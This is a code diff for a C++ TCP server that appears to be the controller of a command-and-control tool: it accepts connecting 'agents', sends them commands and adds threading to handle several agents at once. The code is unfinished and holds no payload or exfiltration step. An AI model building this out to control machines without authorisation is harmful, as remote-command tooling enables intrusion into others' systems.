@@ -4,7 +4,9 @@
 #include <netinet/in.h>
 #include <unistd.h>
 #include <cstdlib>
+#include <thread> // used to implement multithreading so that tcp server can handle multiple clients
 #include <random>
+#include <print>
 #include "server.hpp"
 #include "packet.hpp"
 #include "common.hpp"
@@ -33,10 +35,8 @@ void common::accept_failed(int client_fd){
         std::perror("[*]couldn't accept connection");
         std::cout << std::endl;
         close(client_fd);
-        exit(EXIT_FAILURE);
     }
 }
-
 
 
 std::vector<uint8_t> serialization(packet p1){
@@ -82,6 +82,7 @@ packet packet_wrapping(std::string command, int session_id){
     return p1;
 }
 
+
 void server::send_commands(int soc_fd, int session_id){ // send message to client
     std::string command;
     packet p1;
@@ -92,6 +93,15 @@ void server::send_commands(int soc_fd, int session_id){ // send message to clien
     if(send(soc_fd, byte_array.data(), byte_array.size(), 0) < 0){
         common::code_exit();
     }
+}
+
+
+void server::handle_multiple_clients(int client_fd, int session_id){
+    std::cout << "[+] new agent connected" << std::endl;
+    std::cout << "agent id : " << std::this_thread::get_id() << std::endl;
+    send_commands(client_fd, session_id); // send msg to client
+    std::vector<std::string> command_output;
+    // receive stdout of the command executed in the agent.cpp side
 }
 
 void server::listener(){
@@ -111,13 +121,18 @@ void server::listener(){
     server_address.sin_port = htons(PORT); // listen to port 1234
     bind(server_fd, (struct sockaddr*) &server_address, sizeof(server_address)); // binding
     listen(server_fd, 2); // listening (max connection in queue = 2)
-    int client_fd = accept(server_fd, NULL, NULL); // accept connections from client
-    common::accept_failed(client_fd);
-    int session_id = get_session_id();
-    while(client_fd > 0){
-        send_commands(client_fd, session_id); // send msg to client
-        std::vector<std::string> command_output;
-        // receive stdout of the command executed in the agent.cpp side
+    while(true){ // kept in loop so that multiple clients can be handled
+        // like if one agent connection is lost or connected the loop will start from while(true) again and try to accept new agent connection
+        int client_fd = accept(server_fd, NULL, NULL); // accept connections from client
+        common::accept_failed(client_fd);
+        int session_id = get_session_id();
+        // server object;
+        std::thread client(&server::handle_multiple_clients, this, client_fd, session_id);
+        client.detach();
+        /*
+        IMPLEMENT MULTITHREADING HERE TODO    
+        */
     }
+    std::cout << "[-]server exiting..." << std::endl;
     close(server_fd); // close server_socket created for listening
 }
